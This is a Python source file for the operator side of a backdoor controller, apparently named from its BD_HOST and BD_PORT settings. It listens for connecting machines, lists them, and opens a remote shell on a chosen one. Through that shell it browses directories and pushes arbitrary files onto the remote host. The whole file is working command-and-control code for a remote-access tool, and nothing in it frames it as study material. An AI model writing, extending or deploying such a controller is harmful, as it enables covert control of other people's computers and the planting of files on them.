import socket
import os
from threading import Thread

HOST = str(os.environ.get("BD_HOST"))
PORT = int(os.environ.get("BD_PORT"))
server = socket.socket()
server.bind((HOST, PORT))
print('[+] Server Started')
clients = []
server.listen(5)
connected = False


def handle_client(cl):
    wd = cl.recv(1024)
    wd = wd.decode()
    while True:
        userinput = input(wd + " >>")
        input_list = userinput.split(" ")
        command = input_list[0]
        args = input_list.copy()
        del (args[0])
        if command == "quit":
            cl.send(userinput.encode("UTF-8"))
            break
        if command == 'pwd':
            print(wd)
        elif command == "cd":
            cl.send(userinput.encode("UTF-8"))
            output = cl.recv(1024)
            output = output.decode()
            if output == "invalid":
                print("invalid path")
            else:
                wd = output
        elif command == "ls":
            cl.send(userinput.encode("UTF-8"))
            output = cl.recv(1024)
            output = output.decode()
            print(output)
        elif command == "send":
            send_file_path = args[0]
            send_file_name = args[1]
            if os.path.isfile(send_file_path):
                cl.send(userinput.encode("UTF-8"))
                file = open(send_file_path, "rb")
                data = file.read()
                cl.send(send_file_name.encode("UTF-8"))
                cl.send(data)
                response = cl.recv(1024)
                response = response.decode()
                if response == "failed":
                    print("Failed!")
                    print("There is a file named " + send_file_name + " already!")


def listen_for_clients():
    print("[+] Listening for Connections!")
    while True:
        client, client_addr = server.accept()
        print(f'[+] {client_addr} Client connected to the server')
        c_dict = {"addr": client_addr,
                  "socket": client}
        clients.append(c_dict)


def main():
    # listen for incoming connections
    thread = Thread(target=listen_for_clients)
    thread.start()

    print("[+] Enter command! (help for help)")
    while True:
        user_in = input("[+] >>")
        if user_in == "list":
            for index, c in enumerate(clients):
                print("{0}     {1}".format("INDEX", "ADDRESS"))
                print("{0}     {1}".format(index, c["addr"]))
        elif user_in == "connect":
            idx = int(input("client index: "))
            if len(clients) > idx >= 0:
                print(f"Entering shell on {clients[idx]['addr']}")
                current_client = clients[idx]["socket"]
                handle_client(current_client)
                print("[+] Disconnected successfully!")
            else:
                print(f"{idx} out of bounds for length {len(clients)}")


if __name__ == "__main__":
    main()
